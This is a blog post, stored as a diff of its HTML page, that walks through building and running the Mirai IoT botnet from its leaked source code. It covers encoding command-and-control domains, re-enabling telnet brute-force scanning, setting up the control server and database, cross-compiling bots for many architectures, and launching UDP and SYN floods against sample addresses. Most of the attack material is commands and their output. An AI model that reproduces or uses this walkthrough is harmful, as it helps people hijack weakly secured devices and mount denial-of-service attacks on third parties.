@@ -1,0 +1,214 @@
+
+<!DOCTYPE html>
+<html lang="default" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Build Mirai Botnet and Try It - TyeYeah&#39;s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TyeYeah, CS,"> 
+    <meta name="description" content="blog on Hexo,Mirai is a self-spreading botnet virus. The Mirai botnet code contaminates inadequately secured web,"> 
+    <meta name="author" content="TyeYeah"> 
+    <link rel="alternative" href="atom.xml" title="TyeYeah&#39;s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    <link rel="stylesheet" href="/css/diaspora.css">
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">TyeYeah&#39;s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="../../../.."></a>
+    <div title="Play/Stop" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Build Mirai Botnet and Try It</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="QR Code" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">Build Mirai Botnet and Try It</h1>
+        <div class="stuff">
+            <span>December 03, 2020</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/arm/">arm</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/botnet/">botnet</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/linux/">linux</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/mips/">mips</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>Mirai is a self-spreading botnet virus. The Mirai botnet code contaminates inadequately secured web gadgets by utilizing telnet to discover those that are as yet utilizing their default username and password. The success of Mirai is because of its capacity to contaminate a huge number of these insecure gadgets and coordinate them to mount a DDOS attack against a picked unfortunate victim.<br><img src="/imghost/bmbti/botnet.jpg" alt="IoT botnet"><br>Mirai took advantage of these vulnerable IoT devices in a simple but brilliant way. Rather than trying to use complicated techniques to monitor IoT devices, it examined each bot for open Telnet slots, then tried to log in using 61 random username/password combinations that are frequently used as the standard for these devices. In this way, it was able to generate a military of impacted closed-circuit TV digital cameras and routers, prepared to do its bidding.</p>
+<p>As a famous and well constructed IoT botnet, It is analysed by many security researchers like the <a href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-antonakakis.pdf" target="_blank" rel="noopener">paper</a> from Usenix, and the structure of <code>Mirai</code>:<br><img src="/imghost/bmbti/arch.png" alt="architecture"></p>
+<p>The source code of <code>Mirai</code> has been released on <a href="https://github.com/jgamblin/Mirai-Source-Code" target="_blank" rel="noopener">Github</a> by <a href="https://hackforums.net/showthread.php?tid=5420472" target="_blank" rel="noopener">Anna-senpai</a>, which provides us a good tutorial for building our own botnet.<br>Here we follow the lead to compile and run it.</p>
+<h2 id="Compile-Mirai-Source"><a href="#Compile-Mirai-Source" class="headerlink" title="Compile Mirai Source"></a>Compile Mirai Source</h2><p>The “official” installation guide has been given in a <a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/ForumPost.md" target="_blank" rel="noopener">ForumPost</a> of the <a href="https://hackforums.net/" target="_blank" rel="noopener"><code>hackforum</code></a> (<a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/ForumPost.txt" target="_blank" rel="noopener">See original archived post</a>).</p>
+<h3 id="Install-Requirements"><a href="#Install-Requirements" class="headerlink" title="Install Requirements"></a>Install Requirements</h3><p>Since it is written in <code>C</code> and <code>Go</code>, and the <code>CNC</code> server requires <code>Mysql</code> for storage, so we have to prepare:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git gcc golang electric-fence mysql-server mysql-client</span><br></pre></td></tr></table></figure></p>
+<p>Then remember to get the source code:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/jgamblin/Mirai-Source-Code </span><br><span class="line">$ <span class="built_in">cd</span> Mirai-Source-Code</span><br><span class="line">$ ls</span><br><span class="line">ForumPost.md  ForumPost.txt  LICENSE.md  README.md  dlr/  loader/  mirai/  scripts/</span><br></pre></td></tr></table></figure></p>
+<p>The brief structure image:<img src="/imghost/bmbti/code.jpg" alt="code structure"></p>
+<h3 id="Configure-Bot"><a href="#Configure-Bot" class="headerlink" title="Configure Bot"></a>Configure Bot</h3><p>There are some utils in <code>Mirai-Source-Code/mirai/tools/</code>, and here we use <code>enc.c</code>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mirai/tools &amp;&amp; gcc enc.c -o enc.out    <span class="comment"># compile it</span></span><br><span class="line">$ ./enc.out string cnc.server.com           <span class="comment"># encrypt cnc server domain/ip</span></span><br><span class="line">XOR<span class="string">''</span>ing 15 bytes of data...</span><br><span class="line">\x41\x4C\x41\x0C\x51\x47\x50\x54\x47\x50\x0C\x41\x4D\x4F\x22</span><br><span class="line">$ ./enc.out string report.server.com        <span class="comment"># encrypt report server domain/ip</span></span><br><span class="line">XOR<span class="string">''</span>ing 18 bytes of data...</span><br><span class="line">\x50\x47\x52\x4D\x50\x56\x0C\x51\x47\x50\x54\x47\x50\x0C\x41\x4D\x4F\x22</span><br></pre></td></tr></table></figure></p>
+<p>Then change some strings in <code>Mirai-Source-Code/mirai/bot/table.c</code>, line 18 and line 21:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16</span> <span class="function"><span class="keyword">void</span> <span class="title">table_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function">17 </span>&#123;</span><br><span class="line"><span class="number">18</span>     add_entry(TABLE_CNC_DOMAIN, <span class="string">"\x41\x4C\x41\x0C\x51\x47\x50\x54\x47\x50\x0C\x41\x4D\x4F\x22"</span>, <span class="number">30</span>); <span class="comment">// cnc.server.com</span></span><br><span class="line"><span class="number">19</span>     add_entry(TABLE_CNC_PORT, <span class="string">"\x22\x35"</span>, <span class="number">2</span>);   <span class="comment">// 23</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">21</span>     add_entry(TABLE_SCAN_CB_DOMAIN, <span class="string">"\x50\x47\x52\x4D\x50\x56\x0C\x51\x47\x50\x54\x47\x50\x0C\x41\x4D\x4F\x22"</span>, <span class="number">29</span>); <span class="comment">// report.server.com</span></span><br><span class="line"><span class="number">22</span>     add_entry(TABLE_SCAN_CB_PORT, <span class="string">"\x99\xC7"</span>, <span class="number">2</span>);         <span class="comment">// 48101</span></span><br><span class="line"><span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>Here you can also see the ports are editable.</p>
+<p>Because we usually compile it in <code>debug</code> mode, so we better comment out line 158 and line 162 to let <code>debug</code> mode really scan.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">158</span> <span class="comment">//#ifndef DEBUG</span></span><br><span class="line"><span class="number">159</span> <span class="meta">#<span class="meta-keyword">ifdef</span> MIRAI_TELNET</span></span><br><span class="line"><span class="number">160</span>     scanner_init();</span><br><span class="line"><span class="number">161</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="number">162</span> <span class="comment">//#endif</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="Configure-CNC"><a href="#Configure-CNC" class="headerlink" title="Configure CNC"></a>Configure CNC</h3><p>The <code>CNC</code> server needs a database. The script <code>Mirai-Source-Code/scripts/db.sql</code> should be edited first, add <code>use mirai;</code> in line 2:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mirai;</span><br><span class="line"><span class="keyword">use</span> mirai;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`history`</span> (</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></p>
+<p>Then start <code>Mysql</code> service and update <code>Mysql</code> database with this script (I set <code>root:root</code> for my db):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ service mysql start</span><br><span class="line">$ cat Mirai-Source-Code/scripts/db.sql | mysql -uroot -proot</span><br></pre></td></tr></table></figure></p>
+<p>Add a user to <code>Mysql</code>:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -uroot -proot mirai</span><br><span class="line">mysql&gt; INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, '');</span><br></pre></td></tr></table></figure></p>
+<p>Attention: here if you install mysql for the first time, you may encounter… I will put forward my solutions later.</p>
+<p>Then go to <code>Mirai-Source-Code/mirai/cnc/main.go</code> and edit line 10 to line 14:<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> DatabaseAddr <span class="keyword">string</span>   = <span class="string">"127.0.0.1"</span></span><br><span class="line"><span class="keyword">const</span> DatabaseUser <span class="keyword">string</span>   = <span class="string">"root"</span></span><br><span class="line"><span class="keyword">const</span> DatabasePass <span class="keyword">string</span>   = <span class="string">"root"</span></span><br><span class="line"><span class="keyword">const</span> DatabaseTable <span class="keyword">string</span>  = <span class="string">"mirai"</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="Cross-Compile"><a href="#Cross-Compile" class="headerlink" title="Cross Compile"></a>Cross Compile</h3><p>Create a folder at <code>Mirai</code> root path, and download cross-compilers:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir cross-compile-bin &amp;&amp; <span class="built_in">cd</span> cross-compile-bin</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2</span><br><span class="line">$ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2</span><br></pre></td></tr></table></figure></p>
+<p>Then run script and add some environment variables to <code>~/.bashrc</code>:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ sudo Mirai-Source-Code/script/cross-compile.sh</span><br><span class="line">Install mysql-server and mysql-client (y/n)? ...</span><br><span class="line">$ vi ~/.bashrc</span><br><span class="line">...</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/armv4l/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/armv5l/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/armv6l/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/i586/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/m68k/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/mips/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/mipsel/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/powerpc/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/powerpc-440fp/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/sh4/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/etc/xcompile/sparc/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GOPATH=<span class="variable">$HOME</span>/go</span><br></pre></td></tr></table></figure></p>
+<p>Refresh:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir ~/go</span><br><span class="line">$ <span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure></p>
+<p>Get <code>Golang</code> requirements:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ go get github.com/go-sql-driver/mysql</span><br><span class="line">$ go get github.com/mattn/go-shellwords</span><br></pre></td></tr></table></figure></p>
+<p>Compile <code>Bot</code> and <code>CNC</code> and <code>loader</code><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># compile `bot` and `cnc`</span></span><br><span class="line">$ Mirai-Source-Code/mirai/build.sh debug telnet   <span class="comment"># Usage: ./build.sh &lt;debug | release&gt; &lt;telnet | ssh&gt;</span></span><br><span class="line"><span class="comment"># compile loader</span></span><br><span class="line">$ Mirai-Source-Code/loader/build.sh</span><br></pre></td></tr></table></figure></p>
+<p>Now the <code>BOT</code> (<code>mirai.$ARCH</code>) and <code>CNC</code> binaries, and some other tools are all under <code>mirai/debug/</code> (or <code>mirai/release/</code>) folder.<br>The <code>loader</code> binary is under <code>loader/</code>.</p>
+<h2 id="Attack-with-Mirai"><a href="#Attack-with-Mirai" class="headerlink" title="Attack with Mirai"></a>Attack with Mirai</h2><h3 id="CNC-Server"><a href="#CNC-Server" class="headerlink" title="CNC Server"></a>CNC Server</h3><p>First start <code>CNC</code> server. Attention that in <code>Mirai-Source-Code/mirai/cnc/admin.go</code> line 20:<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    headerb, err := ioutil.ReadFile(<span class="string">"prompt.txt"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>The <code>prompt.txt</code> gets a relative path, so we have to run <code>cnc</code> with <code>prompt.txt</code> existing in our current directory. Or just comment out it. Then you can run it:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> Mirai-Source-Code/mirai/     <span class="comment"># make sure `prompt.txt` in the same dir</span></span><br><span class="line">$ ./debug/cnc</span><br><span class="line">Mysql DB opened</span><br></pre></td></tr></table></figure></p>
+<p>Then you can connect it with <code>telnet</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ telnet cnc.server.com 23</span><br><span class="line"></span><br><span class="line">я люблю куриные наггетсы</span><br><span class="line">пользователь: mirai-user</span><br><span class="line">пароль: **********</span><br><span class="line"></span><br><span class="line">проверив счета... |</span><br><span class="line">[+] DDOS | Succesfully hijacked connection</span><br><span class="line">[+] DDOS | Masking connection from utmp+wtmp...</span><br><span class="line">[+] DDOS | Hiding from netstat...</span><br><span class="line">[+] DDOS | Removing all traces of LD_PRELOAD...</span><br><span class="line">[+] DDOS | Wiping env libc.poison.so.1</span><br><span class="line">[+] DDOS | Wiping env libc.poison.so.2</span><br><span class="line">[+] DDOS | Wiping env libc.poison.so.3</span><br><span class="line">[+] DDOS | Wiping env libc.poison.so.4</span><br><span class="line">[+] DDOS | Setting up virtual terminal...</span><br><span class="line">[!] Sharing access IS prohibited!</span><br><span class="line">[!] Do NOT share your credentials!</span><br><span class="line">Ready</span><br><span class="line">mirai-user@botnet# </span><br><span class="line">mirai-user@botnet# ?</span><br><span class="line">Available attack list</span><br><span class="line">udp: UDP flood</span><br><span class="line">dns: DNS resolver flood using the targets domain, input IP is ignored</span><br><span class="line">ack: ACK flood</span><br><span class="line">greip: GRE IP flood</span><br><span class="line">udpplain: UDP flood with less options. optimized for higher PPS</span><br><span class="line">http: HTTP flood</span><br><span class="line">vse: Valve source engine specific flood</span><br><span class="line">syn: SYN flood</span><br><span class="line">stomp: TCP stomp flood</span><br><span class="line">greeth: GRE Ethernet flood</span><br></pre></td></tr></table></figure></p>
+<p>You can <code>adduser</code> to add and arrange <code>bot</code> for it, use <code>botcount</code> to see <code>bot</code> number.<br>Here <code>?</code> can be understood as a placeholder to explain the meaning of the current position parameter:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mirai-user@botnet# udp ?</span><br><span class="line">Comma delimited list of target prefixes</span><br><span class="line">Ex: 192.168.0.1</span><br><span class="line">Ex: 10.0.0.0/8</span><br><span class="line">Ex: 8.8.8.8,127.0.0.0/29</span><br><span class="line"></span><br><span class="line">mirai-user@botnet# udp 8.8.8.8 ?</span><br><span class="line">Duration of the attack, in seconds</span><br><span class="line"></span><br><span class="line">mirai-user@botnet# udp 8.8.8.8 10 ?</span><br><span class="line">List of flags key=val seperated by spaces. Valid flags for this method are</span><br><span class="line"></span><br><span class="line">tos: TOS field value in IP header, default is 0</span><br><span class="line">ident: ID field value in IP header, default is random</span><br><span class="line">ttl: TTL field in IP header, default is 255</span><br><span class="line">len: Size of packet data, default is 512 bytes</span><br><span class="line">rand: Randomize packet data content, default is 1 (yes)</span><br><span class="line">df: Set the Dont-Fragment bit in IP header, default is 0 (no)</span><br><span class="line">sport: Source port, default is random</span><br><span class="line">dport: Destination port, default is random</span><br><span class="line">source: Source IP address, 255.255.255.255 for random</span><br><span class="line"></span><br><span class="line">Value of 65535 for a flag denotes random (for ports, etc)</span><br><span class="line">Ex: seq=0</span><br><span class="line">Ex: sport=0 dport=65535</span><br></pre></td></tr></table></figure></p>
+<h3 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h3><p>The very first step for attacking, is to run <code>loader</code>. The <code>loader</code> reads <code>telnet</code> entries from STDIN in following format:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip:port user:pass</span><br></pre></td></tr></table></figure></p>
+<p>You can prepare a formatted file and run like this:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cat file.txt | Mirai-Source-Code/loader/loader</span><br><span class="line">0s	Processed: 0	Conns: 0	Logins: 0	Ran: 0	Echoes:0 Wgets: 0, TFTPs: 0</span><br><span class="line">Hit end of input.</span><br></pre></td></tr></table></figure></p>
+<h3 id="Mirai-Bot"><a href="#Mirai-Bot" class="headerlink" title="Mirai Bot"></a>Mirai Bot</h3><p>As for victims, they execute <code>mirai</code> binary to connect back to <code>CNC</code> server and continue to scan (brute forcing) hosts with weak <code>telnet</code> password:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ ./mirai.dbg</span><br><span class="line">DEBUG MODE YO</span><br><span class="line">[main] We are the only process on this system!</span><br><span class="line">listening tun0</span><br><span class="line">[main] Attempting[ to kicollennr] eTrcyint g tto ko illCN pCort</span><br><span class="line"> 23</span><br><span class="line">[killer] Finding and killing processes holding port 23</span><br><span class="line">Failed to find inode for port 23</span><br><span class="line">[killer] Failed to kill port 23</span><br><span class="line">[killer] Bound to tcp/23 (telnet)</span><br><span class="line">[resolv] Got response from select</span><br><span class="line">[resolv] Found IP address: f3251c73</span><br><span class="line">Resolved cnc.server.com to 1 IPv4 addresses</span><br><span class="line">[main] Resolved domain</span><br><span class="line">[main] Connected to CNC. Local address = -335435584</span><br><span class="line">[killer] Detected we are running out of `/path/to/Mirai-Source-Code/mirai/debug/mirai.dbg`</span><br><span class="line">[killer] Memory scanning processes</span><br><span class="line">[table] Tried to access table.11 but it is locked</span><br><span class="line">Got SIGSEGV at address: 0x0</span><br></pre></td></tr></table></figure></p>
+<p>Sometimes encounter <code>[main] Failed to resolve CNC address</code>, it might because in <code>Mirai-Source-Code/mirai/bot/table.c</code> the resolving domain is hardcoded in line 84, you can change it:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);</span><br></pre></td></tr></table></figure></p>
+<p>When it receives commands from <code>CNC</code> it will follow the lead:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[main] Connected to CNC. Local address = -335435584</span><br><span class="line">[main] Received 14 bytes from CNC</span><br><span class="line">[attack] Starting attack...</span><br><span class="line">[main] Received 18 bytes from CNC</span><br><span class="line">[attack] Starting attack...</span><br><span class="line">[main] Received 18 bytes from CNC</span><br><span class="line">[attack] Starting attack...</span><br><span class="line">[main] Received 19 bytes from CNC</span><br><span class="line">[attack] Starting attack...</span><br></pre></td></tr></table></figure></p>
+<p>Attacking history is stored in <code>Mysql</code>:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from history;</span><br><span class="line">+<span class="comment">----+---------+------------+----------+-------------------+----------+</span></span><br><span class="line">| id | user_id | time_sent  | duration | command           | max_bots |</span><br><span class="line">+<span class="comment">----+---------+------------+----------+-------------------+----------+</span></span><br><span class="line">|  1 |       1 | 1478583439 |        1 | syn 10.0.0.1/24 1 |       -1 |</span><br><span class="line">|  2 |       1 | 1478583522 |        1 | syn 8.8.8.8/26 1  |       -1 |</span><br><span class="line">|  3 |       1 | 1478583560 |       10 | syn 8.8.8.8/26 10 |       -1 |</span><br><span class="line">|  4 |       1 | 1478584054 |        1 | udp 8.8.8.8/28 1  |       -1 |</span><br><span class="line">+<span class="comment">----+---------+------------+----------+-------------------+----------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
+<p>In source code it scan totally randomly, we can control the range by editing <code>Mirai-Source-Code/mirai/bot/scanner.c</code> starting from line 674.</p>
+<h3 id="scanListen"><a href="#scanListen" class="headerlink" title="scanListen"></a>scanListen</h3><p>It is a <code>user:pass</code> receiver, run it by:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo Mirai-Source-Code/mirai/debug/scanListen</span><br><span class="line"></span><br><span class="line">xxx.xxx.xxx.xxx:xx  username:password</span><br></pre></td></tr></table></figure></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.hhtjim.com/163/514216257.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.hhtjim.com/163/514213582.mp3"></li>
+                        
+                    
+                        
+                            <li title="2" data-url="https://link.hhtjim.com/163/514216237.mp3"></li>
+                        
+                    
+                        
+                            <li title="3" data-url="https://link.hhtjim.com/163/36664350.mp3"></li>
+                        
+                    
+                        
+                            <li title="4" data-url="https://link.hhtjim.com/163/401722197.mp3"></li>
+                        
+                    
+                        
+                            <li title="5" data-url="https://link.hhtjim.com/163/34228815.mp3"></li>
+                        
+                    
+                        
+                            <li title="6" data-url="https://link.hhtjim.com/163/401723178.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-enable="false" data-ae="false" data-ci data-cs data-r data-o data-a data-d="false">View Comments</div>
+
+
+    </div>
+    
+        <div class="side">
